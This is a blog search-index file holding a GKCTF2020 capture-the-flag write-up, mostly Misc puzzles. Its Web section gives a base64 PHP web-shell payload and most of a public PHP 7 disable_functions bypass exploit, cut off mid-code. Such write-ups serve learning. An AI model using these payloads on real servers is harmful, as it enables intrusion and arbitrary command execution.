<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2020/05/26/Hello-World/</url>
    <content><![CDATA[<p>记录，于2020年5月26日Hexo安装完成</p>
<a id="more"></a>

<h2 id="Front-matter格式："><a href="#Front-matter格式：" class="headerlink" title="Front-matter格式："></a>Front-matter格式：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: title #文章标题</span><br><span class="line">data: 2020-05-26 10:04:14 #文章生成时间</span><br><span class="line">updated: 2020-05-26 10:04:14 #文章更新时间</span><br><span class="line">categories: &quot;Hello World&quot; #文章分类目录，可以省略</span><br><span class="line">tags: #文章标签，可以省略</span><br><span class="line">	- 标签1</span><br><span class="line">	- 标签2</span><br><span class="line">description: #描述，可以忽略</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<h2 id="常用指令："><a href="#常用指令：" class="headerlink" title="常用指令："></a>常用指令：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new [layout] &lt;title&gt; # 新建文章</span><br><span class="line">hexo clean # 清除静态文件</span><br><span class="line">hexo g # 生成静态文件</span><br><span class="line">hexo s # 启动本地服务器</span><br><span class="line">hexo d # 同步到github</span><br><span class="line">hexo g -d # 生成并同步</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>GKCTF2020_Web&amp;Misc</title>
    <url>/2020/05/26/GKCTF2020-Web-Misc/</url>
    <content><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>观看赵师傅直播得flag</p>
<h3 id="code-obfuscation"><a href="#code-obfuscation" class="headerlink" title="code obfuscation"></a>code obfuscation</h3><p>开题一张破损二维码</p>
<p><img src="https://i.loli.net/2020/05/26/NkDbhRFfGW8T3gA.png" alt="image-20200524090638446"></p>
<p>处理一下</p>
<p><img src="https://i.loli.net/2020/05/26/RWJsSpbm3oZhKuD.png" alt="image-20200524091356126"></p>
<p>扫出<code>base(gkctf)</code></p>
<p>binwalk查看发现有rar</p>
<p>base58解出压缩包密码<code>CfjxaPF</code></p>
<p><img src="https://i.loli.net/2020/05/26/vVe5sRLUoTyPhIN.png" alt="image-20200524143912292"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">p, a, c, k, e, d</span>) </span>&#123;</span><br><span class="line">    e = <span class="function"><span class="keyword">function</span>(<span class="params">c</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (c &lt; a ? <span class="string">""</span>: e(<span class="built_in">parseInt</span>(c / a))) + ((c = c % a) &gt; <span class="number">35</span> ? <span class="built_in">String</span>.fromCharCode(c + <span class="number">29</span>) : c.toString(<span class="number">36</span>))</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="string">''</span>.replace(<span class="regexp">/^/</span>, <span class="built_in">String</span>)) &#123;</span><br><span class="line">        <span class="keyword">while</span> (c--) d[e(c)] = k[c] || e(c);</span><br><span class="line">        k = [<span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> d[e]</span><br><span class="line">        &#125;];</span><br><span class="line">        e = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'\\w+'</span></span><br><span class="line">        &#125;;</span><br><span class="line">        c = <span class="number">1</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">while</span> (c--) <span class="keyword">if</span> (k[c]) p = p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span> + e(c) + <span class="string">'\\b'</span>, <span class="string">'g'</span>), k[c]);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125; (<span class="string">'15 n 14 a b c d e f g h i j k l m n o p q r s t u v w x y z 10 11 17="n"12 15 n 14 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 10 11 17="n"12 13=0 15 n 14 a b c d e f g h i j 10 11 16="n"13=$((13+1))12 1g("1f=\' \';1e=\'"\';16=\'#\';1j=\'(\';1i=\')\';1h=\'.\';1a=\';\';19=\'&lt;\';18=\'&gt;\';1d=\'1c\';1b=\'&#123;\';1k=\'&#125;\';1t=\'0\';1u=\'1\';1s=\'2\';1r=\'3\';1n=\'4\';1m=\'5\';1l=\'6\';1q=\'7\';1p=\'8\';1o=\'9\';")'</span>, <span class="number">62</span>, <span class="number">93</span>, <span class="string">'||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||do|eval|done|num|in|for|Bn|An|Ce|Cc|Cb|Cn|_|Cl|Bm|Bk|alert|By|Bt|Bs|Cp|Dg|Df|De|Dj|Di|Dh|Dd|Dc|Da|Db'</span>.split(<span class="string">'|'</span>), <span class="number">0</span>, &#123;&#125;))</span><br></pre></td></tr></table></figure>

<p>解混淆得到（这是伪代码？）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for n in a b c d e f g h i j k l m n o p q r s t u v w x y z do</span><br><span class="line">    eval An&#x3D;&quot;n&quot;</span><br><span class="line">done</span><br><span class="line">for n in A B C D E F G H I J K L M N O P Q R S T U V W X Y Z do</span><br><span class="line">    eval An&#x3D;&quot;n&quot;</span><br><span class="line">done</span><br><span class="line">num&#x3D;0</span><br><span class="line">for n in a b c d e f g h i j do</span><br><span class="line">    eval Bn&#x3D;&quot;n&quot;num&#x3D;$((num+1))</span><br><span class="line">done</span><br><span class="line">alert(&quot;Bk&#x3D;&#39; &#39;;Bm&#x3D;&#39;&quot;&#39;;Bn&#x3D;&#39;#&#39;;Bs&#x3D;&#39;(&#39;;Bt&#x3D;&#39;)&#39;;By&#x3D;&#39;.&#39;;Cb&#x3D;&#39;;&#39;;Cc&#x3D;&#39;&lt;&#39;;Ce&#x3D;&#39;&gt;&#39;;Cl&#x3D;&#39;_&#39;;Cn&#x3D;&#39;&#123;&#39;;Cp&#x3D;&#39;&#125;&#39;;Da&#x3D;&#39;0&#39;;Db&#x3D;&#39;1&#39;;Dc&#x3D;&#39;2&#39;;Dd&#x3D;&#39;3&#39;;De&#x3D;&#39;4&#39;;Df&#x3D;&#39;5&#39;;Dg&#x3D;&#39;6&#39;;Dh&#x3D;&#39;7&#39;;Di&#x3D;&#39;8&#39;;Dj&#x3D;&#39;9&#39;;&quot;)</span><br></pre></td></tr></table></figure>

<p>ocr识别图片，结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce</span><br><span class="line">$Ai$An$At$Bk$Am$Aa$Ai$An$Bs$Bt$Cn</span><br><span class="line">$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb</span><br><span class="line">$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb</span><br><span class="line">$Cp</span><br></pre></td></tr></table></figure>

<p>根据伪代码写解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table = &#123;<span class="string">"Bk"</span>:<span class="string">" "</span>,<span class="string">"Bm"</span>:<span class="string">"\""</span>,<span class="string">"Bn"</span>:<span class="string">"#"</span>,<span class="string">"Bs"</span>:<span class="string">"("</span>,<span class="string">"Bt"</span>:<span class="string">")"</span>,<span class="string">"By"</span>:<span class="string">"."</span>,<span class="string">"Cb"</span>:<span class="string">";"</span>,<span class="string">"Cc"</span>:<span class="string">"&lt;"</span>,<span class="string">"Ce"</span>:<span class="string">"&gt;"</span>,<span class="string">"Cl"</span>:<span class="string">"_"</span>,<span class="string">"Cn"</span>:<span class="string">"&#123;"</span>,<span class="string">"Cp"</span>:<span class="string">"&#125;"</span>,<span class="string">"Da"</span>:<span class="string">"0"</span>,<span class="string">"Db"</span>:<span class="string">"1"</span>,<span class="string">"Dc"</span>:<span class="string">"2"</span>,<span class="string">"Dd"</span>:<span class="string">"3"</span>,<span class="string">"De"</span>:<span class="string">"4"</span>,<span class="string">"Df"</span>:<span class="string">"5"</span>,<span class="string">"Dg"</span>:<span class="string">"6"</span>,<span class="string">"Dh"</span>:<span class="string">"7"</span>,<span class="string">"Di"</span>:<span class="string">"8"</span>,<span class="string">"Dj"</span>:<span class="string">"9"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag3.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c = f.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> c:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(line)//<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">if</span> line[i*<span class="number">3</span>+<span class="number">1</span>]==<span class="string">"A"</span>:</span><br><span class="line">            print(line[i*<span class="number">3</span>+<span class="number">2</span>],end=<span class="string">''</span>)</span><br><span class="line">        <span class="keyword">elif</span> line[i*<span class="number">3</span>+<span class="number">1</span>]==<span class="string">"B"</span> <span class="keyword">and</span> line[i*<span class="number">3</span>+<span class="number">2</span>] <span class="keyword">in</span> [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>]:</span><br><span class="line">            print(line[i*<span class="number">3</span>+<span class="number">2</span>],end=<span class="string">''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(table[line[i*<span class="number">3</span>+<span class="number">1</span>:i*<span class="number">3</span>+<span class="number">3</span>]],end=<span class="string">''</span>)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure>

<p>得到结果</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"w3lc0me_4o_9kct5"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以flag为<code>flag{w3lc0me_4o_9kct5}</code></p>
<h3 id="Pokémon"><a href="#Pokémon" class="headerlink" title="Pokémon"></a>Pokémon</h3><p>一个gba文件</p>
<p>走到103道路，地上的草丛就是flag。</p>
<h3 id="Harley-Quinn"><a href="#Harley-Quinn" class="headerlink" title="Harley Quinn"></a>Harley Quinn</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ivy给Harley发了一个短信……算了，编不下去了，先听后看就完事了……</span><br><span class="line"></span><br><span class="line">音频解码可能有误差，密码为有意义的无空格小写短句 解密版本为1.25</span><br></pre></td></tr></table></figure>

<p>发现最后有一段奇怪的东西</p>
<p><img src="https://i.loli.net/2020/05/26/hi6TrMYqIwOHtsL.png" alt="image-20200524113240723"></p>
<p>用<span class="exturl" data-url="aHR0cDovL2FsdWlnaS5hbHRlcnZpc3RhLm9yZy9teXRvb2x6Lmh0bSNkdG1mMm51bQ==">dtmf2num.exe<i class="fa fa-external-link-alt"></i></span>截取得到信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DTMF2NUM 0.1.1</span><br><span class="line">by Luigi Auriemma</span><br><span class="line">e-mail: aluigi@autistici.org</span><br><span class="line">web:    aluigi.org</span><br><span class="line"></span><br><span class="line">- open Heathens_cut.wav</span><br><span class="line">  wave size      493920</span><br><span class="line">  format tag     1</span><br><span class="line">  channels:      2</span><br><span class="line">  samples&#x2F;sec:   44100</span><br><span class="line">  avg&#x2F;bytes&#x2F;sec: 176400</span><br><span class="line">  block align:   4</span><br><span class="line">  bits:          16</span><br><span class="line">  samples:       246960</span><br><span class="line">  bias adjust:   14</span><br><span class="line">  volume peaks:  -31205 31205</span><br><span class="line">  normalize:     1562</span><br><span class="line">  resampling to: 8000hz</span><br><span class="line"></span><br><span class="line">- MF numbers:    844778</span><br><span class="line"></span><br><span class="line">- DTMF numbers:  #222833344477773338866#</span><br></pre></td></tr></table></figure>

<p>对应九键中的<code>ctfisfun</code></p>
<p>图片的最后有奇怪的东西</p>
<p><img src="https://i.loli.net/2020/05/26/CGszBuVUbZvhl5o.png" alt="image-20200524151942891"></p>
<p>hint2得知free_file_camouflage</p>
<p>使用密码<code>ctfisfun</code>提取出flag.txt得到flag <code>flag{Pudd1n!!_y0u_F1nd_m3!}</code></p>
<h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p>填写问卷提交得flag</p>
<h3 id="Sail-a-boat-down-the-river"><a href="#Sail-a-boat-down-the-river" class="headerlink" title="Sail a boat down the river"></a>Sail a boat down the river</h3><p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5MzcyNy9hcnRpY2xlL2RldGFpbHMvMTA2MzI1MTk3">https://blog.csdn.net/weixin_45793727/article/details/106325197<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://i.loli.net/2020/05/26/FLZOw7HQR9dlrkP.png" alt="image-20200524121920906.png"></p>
<p>视频中二维码<code>https://pan.baidu.com/s/1tygt0Nm_G5fTfVFlgxVcrQ</code>需要提取码</p>
<p>Hint1 ：闪烁的光芒</p>
<p>视频中</p>
<p><img src="https://i.loli.net/2020/05/26/zrIEObndhS3CcAs.png" alt="image-20200525091246969"></p>
<p>有四段闪烁，怀疑是摩斯密码</p>
<p>抽帧提出来，一帧为<code>.</code>三帧为<code>-</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-.--&#x2F;.--&#x2F;---..&#x2F;--.</span><br><span class="line">YW8G</span><br></pre></td></tr></table></figure>

<p>下载得到<code>shudu.txt</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 8 1 7 4 0 0 0 0</span><br><span class="line">3 0 2 0 6 8 0 0 0</span><br><span class="line">4 0 6 5 0 0 8 2 0</span><br><span class="line">0 3 0 0 0 0 0 5 6</span><br><span class="line">7 0 4 3 0 9 2 0 1</span><br><span class="line">1 2 0 0 0 0 0 4 0</span><br><span class="line">0 5 9 0 0 4 1 0 8</span><br><span class="line">0 0 0 1 8 0 9 0 2</span><br><span class="line">0 0 0 0 9 7 4 6 0</span><br><span class="line"></span><br><span class="line">密文:</span><br><span class="line">efb851bdc71d72b9ff668bddd30fd6bd</span><br><span class="line">密钥:</span><br><span class="line">第一列九宫格从左到右从上到下</span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cDovL3d3dy5sbGFuZy5uZXQvc3Vkb2t1L2NhbHN1ZG9rdS5odG1s">在线解数独<i class="fa fa-external-link-alt"></i></span></p>
<p>得到解出的数独</p>
<p><img src="https://i.loli.net/2020/05/26/q1sEChp4KDNrcOg.png" alt="image-20200525094223251"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">假密钥:57998652647813</span><br><span class="line">(Hint2 : 是一行不是一列)</span><br><span class="line">真密钥:52693795149137</span><br></pre></td></tr></table></figure>

<p>Hint3 : 常见的加密，那就尝试AES 和 DES</p>
<p><span class="exturl" data-url="aHR0cHM6Ly90aGUteC5jbi9jcnlwdG9ncmFwaHkvQWVzLmFzcHg=">在线解密<i class="fa fa-external-link-alt"></i></span></p>
<p>修改填充模式（ISO10126成功）</p>
<p>解出为<code>GG0kc.tf</code></p>
<p>解压压缩包得到<code>逆光 vocal.ovex</code></p>
<p>使用<a href="https://www.overturechina.com/" target="_blank" rel="noopener"><code>Overture</code></a>打开</p>
<p><img src="https://i.loli.net/2020/05/26/WqJB8fhlGveCduK.png" alt="image-20200525101444400"> <img src="https://i.loli.net/2020/05/26/8s1pirC3Qhkc2vo.png" alt="image-20200525101450171"> <img src="https://i.loli.net/2020/05/26/JB1gutkDij9mWwR.png" alt="image-20200525101455020"></p>
<p>即<code>flag{gkctf_is_fun}</code></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZ2VtLWxvdmUuY29tL2N0Zi8yMzYxLmh0bWw=">https://www.gem-love.com/ctf/2361.html<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5jaGFyYS5wdWIvYmxvZy8yMDIwLzA1LzI0L2drY3RmLXdyaXRldXAv">http://www.chara.pub/blog/2020/05/24/gkctf-writeup/<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<h3 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;&#x2F;title&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ClassName</span><br><span class="line">&#123;</span><br><span class="line">        public $code &#x3D; null;</span><br><span class="line">        public $decode &#x3D; null;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;code &#x3D; @$this-&gt;x()[&#39;Ginkgo&#39;];</span><br><span class="line">                $this-&gt;decode &#x3D; @base64_decode( $this-&gt;code );</span><br><span class="line">                @Eval($this-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function x()</span><br><span class="line">        &#123;</span><br><span class="line">                return $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">new ClassName();</span><br></pre></td></tr></table></figure>

<p>构造一句话套娃payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?Ginkgo&#x3D;@eval($_POST[&#39;crzz&#39;]);</span><br><span class="line">&#x3D;base64&#x3D;&gt;</span><br><span class="line">&#x2F;?Ginkgo&#x3D;QGV2YWwoJF9QT1NUWydjcnp6J10pOw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>使用蚁剑连接，在根目录找到<code>flag</code>和<code>readflag</code>，flag我们没有权限读</p>
<p>但是发现很多命令都执行不了，查看phpinfo()</p>
<p><img src="https://i.loli.net/2020/05/26/fEcV9JiHzv6PG2C.png" alt="image-20200525080231403"></p>
<p>发现能命令执行得函数都被禁用了，要想办法绕过。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21tMHIxL2V4cGxvaXRzL3RyZWUvbWFzdGVyL3BocDctZ2MtYnlwYXNz">bypass脚本<i class="fa fa-external-link-alt"></i></span></p>
<p>稍作修改后上传到/tmp目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"/readflag"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $out = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span><span class="params">($base)</span> </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span><span class="params">($base, $elf)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'constant' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'bin2hex' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span><span class="params">($binary_leak)</span> </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span><span class="params">($basic_funcs)</span> </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $ryat;</span><br><span class="line">        <span class="keyword">var</span> $chtg;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">'WIN'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'This PoC is for *nix systems only.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(<span class="string">'A'</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    $poc = <span class="string">'a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:"ryat":2:&#123;s:4:"ryat";R:3;s:4:"chtg";i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;'</span>;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[<span class="number">0</span>] = ptr2str(<span 